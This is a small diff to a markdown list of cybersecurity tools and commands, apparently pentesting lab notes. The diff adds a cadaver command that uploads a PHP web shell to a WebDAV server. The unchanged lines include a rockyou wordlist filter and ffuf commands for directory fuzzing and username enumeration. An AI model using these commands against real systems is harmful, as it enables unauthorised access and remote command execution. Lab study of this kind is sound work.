@@ -20,7 +20,9 @@ List of tools/resources for Cybersecurity
   - XSStrike (XSS scanner with payload fuzzing)
   - ```cat /usr/share/wordlists/rockyou.txt | grep -v "#" | grep -v "!" | grep -v "%" | grep -v "?" | grep -v "/" >> /usr/share/wordlists/rockyou3.txt```
   - ```cadaver http://192.68.0.51/dav/```
+  - ```put webshell/phpshell.php```
 
+    
 ### Important Commands
     - ``` ffuf -w /path/to/wordlist -u https://target/FUZZ ```
     - ``` ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.134.222/customers/signup -mr "username already exists" ```
